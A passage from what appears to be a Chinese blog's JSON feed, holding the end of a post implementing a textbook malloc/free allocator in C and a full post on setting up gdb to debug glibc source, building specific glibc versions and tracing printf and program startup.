class=\"comment\">//内存块的头部信息</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">header</span> *<span class=\"title\">ptr</span>;</span> <span class=\"comment\">// 空闲块链表中的下一块</span></span><br><span class=\"line\">        <span class=\"type\">unsigned</span> size; <span class=\"comment\">// 当前块的大小</span></span><br><span class=\"line\">    &#125; s;</span><br><span class=\"line\">    Align x; <span class=\"comment\">//强制块的对齐 (效果就是8字节对齐,计算机中对齐通常取决于包含的最大基本数据类型的大小</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">header</span> <span class=\"title\">Header</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> Header base; <span class=\"comment\">//从空链表开始?</span></span><br><span class=\"line\"><span class=\"type\">static</span> Header *freep  = <span class=\"literal\">NULL</span>; <span class=\"comment\">//空闲链表的初始指针</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">malloc</span><span class=\"params\">(<span class=\"type\">unsigned</span> nbytes)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Header *p,*prevp;</span><br><span class=\"line\">    Header *<span class=\"title function_\">morecore</span><span class=\"params\">(<span class=\"type\">unsigned</span>)</span>;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> nunits;</span><br><span class=\"line\"></span><br><span class=\"line\">    nunits = (nbytes+<span class=\"keyword\">sizeof</span>(Header)<span class=\"number\">-1</span>)/<span class=\"keyword\">sizeof</span>(Header)+<span class=\"number\">1</span>;<span class=\"comment\">// +1是那个Align x?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((prevp=freep) == <span class=\"literal\">NULL</span>)&#123; <span class=\"comment\">//没有空闲链表</span></span><br><span class=\"line\">        base.s.ptr = freep = prevp = &amp;base;</span><br><span class=\"line\">        base.s.size= <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(p = prevp-&gt;s.ptr; ;prevp=p,p = p-&gt;s.ptr)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p-&gt;s.size &gt; nunits)&#123;<span class=\"comment\">//足够大</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p-&gt;s.size == nunits) <span class=\"comment\">//正好</span></span><br><span class=\"line\">                    prevp-&gt;s.ptr = p-&gt;s.ptr; <span class=\"comment\">//从链表中卸下p</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;  <span class=\"comment\">//大了,分配剩下的</span></span><br><span class=\"line\">                p-&gt;s.size = p-&gt;s.size - nunits; <span class=\"comment\">//剩下的大小</span></span><br><span class=\"line\">                p += p-&gt;s.size; <span class=\"comment\">//p移动到了分配的那里</span></span><br><span class=\"line\">                p -&gt;s.size = nunits;<span class=\"comment\">//p的大小改成了分配的大小,(那之前的呢?)</span></span><br><span class=\"line\">            <span class=\"comment\">// 逻辑是这样,找到的块太大的话,把尾部返回给用户,</span></span><br><span class=\"line\">            <span class=\"comment\">//这样,初始块的头部只需要修改size就可以了</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            freep = prevp;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"type\">void</span> *)(p+<span class=\"number\">1</span>);<span class=\"comment\">//返回数据部分的指针</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p == freep) <span class=\"comment\">//闭环的空闲链表</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((p = morecore(nunits)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>; <span class=\"comment\">//没有剩余的存储空间了</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">free</span><span class=\"params\">(<span class=\"type\">void</span> *ap)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Header *bp, *p;</span><br><span class=\"line\"></span><br><span class=\"line\">    bp  = (Header *)ap - <span class=\"number\">1</span>; <span class=\"comment\">//指向块头</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class=\"line\">            <span class=\"keyword\">break</span>; <span class=\"comment\">//被释放的块在链表的开头或者末尾</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( bp + bp-&gt;s.size == p-&gt;s.ptr)&#123; <span class=\"comment\">//与前面相邻块合并</span></span><br><span class=\"line\">        bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;</span><br><span class=\"line\">        bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">        bp-&gt;s.ptr = p-&gt;s.ptr; <span class=\"comment\">//串进链表里</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p + p-&gt;s.size == bp)&#123; <span class=\"comment\">//与后面的堆块合并</span></span><br><span class=\"line\">        p-&gt;s.size += bp-&gt;s.size;</span><br><span class=\"line\">        p-&gt;s.ptr = bp-&gt;s.ptr; <span class=\"comment\">//这一句是不是没必要呢?? 有必要的,如果上一次和前面的合并了</span></span><br><span class=\"line\">        <span class=\"comment\">//这里也可能出现再次合并, 这里需要修改指针的</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">        p-&gt;s.ptr = bp;</span><br><span class=\"line\">    freep = p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NALLOC 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\">Header *<span class=\"title function_\">morecore</span><span class=\"params\">(<span class=\"type\">unsigned</span> nu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *cp, *sbrk(<span class=\"type\">int</span>);</span><br><span class=\"line\">    Header *up;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nu &lt; NALLOC) nu = NALLOC;</span><br><span class=\"line\"></span><br><span class=\"line\">    cp = sbrk(nu * <span class=\"keyword\">sizeof</span>(Header));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cp == (<span class=\"type\">char</span> *) <span class=\"number\">-1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    up = (Header *) cp;</span><br><span class=\"line\">    up-&gt;s.size = nu;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>((<span class=\"type\">void</span> * )(up+<span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> freep;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> *str1;</span><br><span class=\"line\">        <span class=\"type\">char</span> *str2;</span><br><span class=\"line\">        str1 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>);</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(str1, <span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">        str2 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(str2, <span class=\"string\">&quot;tang&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n",
            "tags": [
                "C语言"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/",
            "title": "pwn入门-46-glibc源码调试",
            "date_published": "2023-11-06T13:01:36.000Z",
            "content_html": "<p>​\t有时候需要看库函数哪里出问题了,有源码调试的话,看起来会更直观和方便</p>\n<h1 id=\"glibc源代码调试\"><a href=\"#glibc源代码调试\" class=\"headerlink\" title=\"glibc源代码调试\"></a>glibc源代码调试</h1><p>​\t开启gdb后 dir  xxxx目录 即可</p>\n<p>​\t但dir命令加载源码只能指定单个目录或文件,在gdb启动的时候用这个命令来加载glibc源码进去就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb `find ~/path/to/glibc/source -type d -<span class=\"built_in\">printf</span> <span class=\"string\">&#x27;-d %p &#x27;</span>` ./a.out</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"当前机器版本libc\"><a href=\"#当前机器版本libc\" class=\"headerlink\" title=\"当前机器版本libc\"></a>当前机器版本libc</h2><p>​\t安装带调试版本libc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install libc6-dbg  </span><br><span class=\"line\">apt install libc6-dbg:i386</span><br></pre></td></tr></table></figure>\n\n<p>​\t下载对应的源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> 修改/etc/apt/sources.<span class=\"built_in\">list</span> 开启deb-src (不知道是不是都要开)</span><br><span class=\"line\"><span class=\"number\">2.</span> apt update</span><br><span class=\"line\"><span class=\"number\">3.</span> apt source libc6-dev</span><br></pre></td></tr></table></figure>\n\n<p>​\t注意第三步会在当前目录进行下载</p>\n<p>​\t调试的时候进行指定即可: gdb -q .&#x2F;pwn -d &#x2F;xxx&#x2F;xxx&#x2F;glibc-2.31&#x2F; </p>\n<h1 id=\"不同版本glibc下载与编译\"><a href=\"#不同版本glibc下载与编译\" class=\"headerlink\" title=\"不同版本glibc下载与编译\"></a>不同版本glibc下载与编译</h1><h2 id=\"官方下载与编译\"><a href=\"#官方下载与编译\" class=\"headerlink\" title=\"官方下载与编译\"></a>官方下载与编译</h2><p><a href=\"https://ftp.gnu.org/gnu/glibc/\">https://ftp.gnu.org/gnu/glibc/</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone git://sourceware.org/git/glibc.git &amp;&amp; cd glibc</span><br><span class=\"line\">git checkout glibc-2.31</span><br><span class=\"line\">mkdir build &amp;&amp; cd build</span><br><span class=\"line\">../configure --prefix=/usr/local/glibc-2.31-debug --enable-debug=yes</span><br><span class=\"line\">make -j16</span><br><span class=\"line\">make install    # 这时候/usr/local/glibc-2.31-debug/就有文件了 包含库文件和头文件</span><br></pre></td></tr></table></figure>\n\n<p>查看当前分支: git branch</p>\n<p>查看有哪些分支: git branch -a</p>\n<h3 id=\"指定编译好的库进行文件编译\"><a href=\"#指定编译好的库进行文件编译\" class=\"headerlink\" title=\"指定编译好的库进行文件编译\"></a>指定编译好的库进行文件编译</h3><p>​\t–rpath指定共享库路径  -I指定动态链接器</p>\n<p>​\t就可以用指定的libc来编译代码了, 这样的话, 也会很自然就有glibc的源代码可以调试了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -L/usr/local/glibc<span class=\"number\">-2.31</span>-debug/lib -Wl,--rpath=/usr/local/glibc<span class=\"number\">-2.31</span>-debug/lib -Wl,-I/usr/local/glibc<span class=\"number\">-2.31</span>-debug/lib/ld<span class=\"number\">-2.31</span>.so hello.c -o hello</span><br></pre></td></tr></table></figure>\n\n<p>​\t为什么不用加 -g了? (需要的,如果要看hello.c的源代码的话)</p>\n<p>​\t但是用glibcallinone下载的不行..有问题, 那是因为它只有编译好的库,没有头文件之类的吧?</p>\n<h2 id=\"glibc-all-in-one工具\"><a href=\"#glibc-all-in-one工具\" class=\"headerlink\" title=\"glibc-all-in-one工具\"></a>glibc-all-in-one工具</h2><p>​\t这里是编译好的,一般都是带符号的,但是如果需要源代码调试还是需要下载源码并加载进gdb里面进行调试</p>\n<p>​\t<a href=\"https://blog.csdn.net/csdn546229768/article/details/122691241\">https://blog.csdn.net/csdn546229768/article/details/122691241</a></p>\n<p>​\t如果网站里没有的话,就修改download源代码, 换个source看看,google精准搜索搜索一下</p>\n<h3 id=\"debug信息\"><a href=\"#debug信息\" class=\"headerlink\" title=\"debug信息\"></a>debug信息</h3><p>​\t符号文件在哪呢, 被编译进程序里了吧,我记得之前有单独的符号文件的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231023223614611.png\" alt=\"image-20231023223614611\"></p>\n<p>ls -al &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;.build-id&#x2F;这里有</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drwxr-xr-x   <span class=\"number\">2</span> root root  <span class=\"number\">4096</span> <span class=\"number\">7</span>月  <span class=\"number\">27</span> <span class=\"number\">10</span>:<span class=\"number\">48</span> .</span><br><span class=\"line\">drwxr-xr-x <span class=\"number\">236</span> root root  <span class=\"number\">4096</span> <span class=\"number\">7</span>月  <span class=\"number\">27</span> <span class=\"number\">10</span>:<span class=\"number\">48</span> ..</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">23496</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> <span class=\"number\">329f</span>3d85e153a01672b77b853beda0faf0dee6.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">20104</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> <span class=\"number\">9f</span>5043bbf7cfbf4dfd27684d9c3cbcbb835bd9.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">19468</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> b0728b23be4032704a004d8066a268c4b6924a.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">20052</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> bbb582f3d2cd3464764682f1937b4e3d9c2641.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">22200</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> c4ae3a65bc87ea96986b3b2441e892c8a433f0.debug</span><br><span class=\"line\">-rw-r--r--   <span class=\"number\">1</span> root root <span class=\"number\">22168</span> <span class=\"number\">4</span>月   <span class=\"number\">7</span>  <span class=\"number\">2022</span> cd9124f765fe93560701d55d5c61c37be4657a.debug</span><br></pre></td></tr></table></figure>\n\n\n\n<p>但是glibcallinone里没找到这个呀…</p>\n<p>他们之间是什么关系呢?</p>\n<h2 id=\"libc编译案例\"><a href=\"#libc编译案例\" class=\"headerlink\" title=\"libc编译案例\"></a>libc编译案例</h2><p>​\t做一道题需要23版本的libc,用ubuntu20编译的有问题..换18试试 (也有很多报错, 难道得换debian?)</p>\n<p>​\tsource是源码,右边是编译好的,但是没有符号信息</p>\n<p>​\t难道版本不对? 这个source看起来是没有什么问题的,下载后看了下源码文件</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231023213302220.png\" alt=\"image-20231023213302220\"></p>\n<p><a href=\"https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu11\">https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu11</a></p>\n<p><a href=\"http://launchpadlibrarian.net/409875491/libc6_2.23-0ubuntu11_amd64.deb\">http://launchpadlibrarian.net/409875491/libc6_2.23-0ubuntu11_amd64.deb</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir build &amp;&amp; cd build</span><br><span class=\"line\">../configure --prefix=/usr/local/glibc<span class=\"number\">-2.23</span>-debug --enable-debug=yes</span><br><span class=\"line\">make -j16</span><br><span class=\"line\">make install    # 这时候/usr/local/glibc<span class=\"number\">-2.23</span>-debug/就有文件了 包含库文件和头文件</span><br></pre></td></tr></table></figure>\n\n\n\n<p>罢了……..还是报错….处理不了……..(回头试试16, 或者说 还是得换debian?  不纠结这个编译问题了…)</p>\n<h3 id=\"转机\"><a href=\"#转机\" class=\"headerlink\" title=\"转机\"></a>转机</h3><p><a href=\"https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11\">https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11</a></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231106210245051.png\" alt=\"image-20231106210245051\"></p>\n<p>嘶,用了一下还是不太行</p>\n<p>不过实际做题也未必要一模一样的环境,反正给了libc,可以从里面找偏移</p>\n<h3 id=\"报错处理\"><a href=\"#报错处理\" class=\"headerlink\" title=\"报错处理\"></a>报错处理</h3><p>之前报错说要加–disable-werror, 但是好像也没啥用,</p>\n<p>..&#x2F;configure –disable-werror  –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;glibc-2.23  –enable-debug&#x3D;yes</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error: argument <span class=\"number\">1</span> of type ‘<span class=\"class\"><span class=\"keyword\">struct</span> __<span class=\"title\">jmp_buf_tag</span> *’ <span class=\"title\">declared</span> <span class=\"title\">as</span> <span class=\"title\">a</span> <span class=\"title\">pointer</span> [-<span class=\"title\">Werror</span>=</span><span class=\"built_in\">array</span>-parameter=]</span><br><span class=\"line\">  <span class=\"number\">743</span> | <span class=\"keyword\">extern</span> <span class=\"type\">int</span> __sigsetjmp (<span class=\"keyword\">struct</span> __jmp_buf_tag *__env,</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://stackoverflow.com/questions/76079071/when-i-compile-glibc-2-28-with-the-make-command-on-centos-7-5-i-got-the-error-l\">https://stackoverflow.com/questions/76079071/when-i-compile-glibc-2-28-with-the-make-command-on-centos-7-5-i-got-the-error-l</a></p>\n<p>make[1]: *** [Makefile:214: stdio-common&#x2F;subdir_lib] Error</p>\n<p><a href=\"https://www.cnblogs.com/zq10/p/14314952.html\">https://www.cnblogs.com/zq10/p/14314952.html</a></p>\n<p><a href=\"https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19\">https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19</a></p>\n<p>make[2]: *** No rule to make target ‘..&#x2F;manual&#x2F;errno.texi’, needed by ‘..&#x2F;sysdeps&#x2F;gnu&#x2F;errlist.c’.  Stop</p>\n<p>Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion &#96;sym !&#x3D; NULL’ failed!</p>\n<p>问: 这里有现成的libc可以用,但是没有符号文件,    符号和源代码又是两回事吧</p>\n<p>答: 是的,两回事</p>\n<p>问: 没有符号咋办, 只能进行编译吗..</p>\n<p>答:  我记得之前做海大ctf,ida可以导入符号文件,网上有编译好的符号文件,这个网站上也有symbol, 但是不全</p>\n<p>问: gcc直接用这里的库编译会有问题,需要install?</p>\n<p>问: 如何编译符号文件呢</p>\n<h1 id=\"调试案例\"><a href=\"#调试案例\" class=\"headerlink\" title=\"调试案例\"></a>调试案例</h1><h2 id=\"printf的调用路径\"><a href=\"#printf的调用路径\" class=\"headerlink\" title=\"printf的调用路径\"></a>printf的调用路径</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello,%s\\n&quot;</span>,<span class=\"string\">&quot;world&quot;</span>); <span class=\"comment\">//防止优化为puts</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t调试, bt追踪栈</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">0  0x00007ffff7e5ca69 <span class=\"keyword\">in</span> __printf (format=0x55555555600a <span class=\"string\">&quot;hello,%s\\n&quot;</span>) at printf.c:28</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">1  0x0000555555555169 <span class=\"keyword\">in</span> main ()</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">2  0x00007ffff7e2d013 <span class=\"keyword\">in</span> __libc_start_main (main=0x555555555149 &lt;main&gt;, argc=1, argv=0x7fffffffe5a8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe598) at ../csu/libc-start.c:308</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">3  0x000055555555508e <span class=\"keyword\">in</span> _start ()</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t会发现进入的是__printf函数,为什么不是printf函数呢? 需要看libc源代码</p>\n<p>​\t进到这里是因为ldbl_strong_alias (__printf, printf); 将printf和  _ _ printf进入了的函数统一为 _ _printf</p>\n<p>​\tstdio-common&#x2F;printf.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;libioP.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdarg.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> printf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Write formatted output to stdout from the format string FORMAT.  */</span></span><br><span class=\"line\"><span class=\"comment\">/* VARARGS1 */</span></span><br><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">__printf (<span class=\"type\">const</span> <span class=\"type\">char</span> *format, ...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  va_list arg;</span><br><span class=\"line\">  <span class=\"type\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_start (arg, format);</span><br><span class=\"line\">  done = <span class=\"built_in\">vfprintf</span> (<span class=\"built_in\">stdout</span>, format, arg);</span><br><span class=\"line\">  va_end (arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_printf</span></span><br><span class=\"line\">ldbl_strong_alias (__printf, <span class=\"built_in\">printf</span>);</span><br><span class=\"line\"><span class=\"comment\">/* This is for libg++.  */</span></span><br><span class=\"line\">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t__printf又主要调用了vfprintf函数,在stdio-common&#x2F;vfprintf.c中, 这个函数有点长</p>\n<h2 id=\"函数完整加载过程\"><a href=\"#函数完整加载过程\" class=\"headerlink\" title=\"函数完整加载过程\"></a>函数完整加载过程</h2><p>恩….比较复杂..有时间专门学习下..</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/callgraph.png\" alt=\"image of the callgraph for all the routines involved in program startup on linux\"></p>\n<p>原文地址: <a href=\"http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html\">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a></p>\n<p>翻译: <a href=\"https://zhuanlan.zhihu.com/p/52054044\">https://zhuanlan.zhihu.com/p/52054044</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/521205296\">https://zhuanlan.zhihu.com/p/521205296</a></p>\n<p>其他参考: </p>\n<p><a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2021/12/12/csu/\">https://xuanxuanblingbling.github.io/ctf/pwn/2021/12/12/csu/</a></p>\n<p>程序员的自我修养里面也有</p>\n<h3 id=\"start\"><a href=\"#start\" class=\"headerlink\" title=\"_start\"></a>_start</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000001060 &lt;_start&gt;:</span><br><span class=\"line\">    1060:\tf3 0f 1e fa          \tendbr64</span><br><span class=\"line\">    1064:\t31 ed                \txor    %ebp,%ebp</span><br><span class=\"line\">    1066:\t49 89 d1             \tmov    %rdx,%r9</span><br><span class=\"line\">    1069:\t5e                   \tpop    %rsi</span><br><span class=\"line\">    106a:\t48 89 e2             \tmov    %rsp,%rdx</span><br><span class=\"line\">    106d:\t48 83 e4 f0          \tand    $0xfffffffffffffff0,%rsp</span><br><span class=\"line\">    1071:\t50                   \tpush   %rax</span><br><span class=\"line\">    1072:\t54                   \tpush   %rsp</span><br><span class=\"line\">    1073:\t4c 8d 05 66 01 00 00 \tlea    0x166(%rip),%r8        # 11e0 &lt;__libc_csu_fini&gt;</span><br><span class=\"line\">    107a:\t48 8d 0d ef 00 00 00 \tlea    0xef(%rip),%rcx        # 1170 &lt;__libc_csu_init&gt;</span><br><span class=\"line\">    1081:\t48 8d 3d c1 00 00 00 \tlea    0xc1(%rip),%rdi        # 1149 &lt;main&gt;</span><br><span class=\"line\">    1088:\tff 15 52 2f 00 00    \tcallq  *0x2f52(%rip)        # 3fe0 &lt;__libc_start_main@GLIBC_2.2.5&gt;</span><br><span class=\"line\">    108e:\tf4                   \thlt</span><br><span class=\"line\">    108f:\t90                   \tnop</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h3 id=\"libc-start-main\"><a href=\"#libc-start-main\" class=\"headerlink\" title=\"__libc_start_main\"></a>__libc_start_main</h3><p>starti可以从最开始启动时下断点</p>\n<p><img 